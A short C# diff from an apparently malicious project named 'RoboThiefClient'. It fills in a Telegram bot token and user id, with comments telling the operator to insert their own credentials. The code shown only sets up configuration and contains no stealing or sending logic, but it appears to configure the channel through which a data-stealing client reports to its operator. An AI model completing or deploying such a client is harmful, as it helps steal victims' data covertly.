@@ -8,16 +8,16 @@ namespace RoboThiefClient
 {
     public static class TelegramBot
     {
-        public static const String BotToken;
-        public static const String id;
+        public static  String BotToken;
+        public static String id;
 
         public static void SetValues()
         {
 	    // Put your Bot token received from BotFather...
-            BotToken = "";
+            BotToken = "123456789:AAGDzfghhgfjjghrGGRHHkHPMffMNKo";
 	    
 	    // Put your Userid here
-            id = "";
+            id = "123456789";
         }
     }
 }
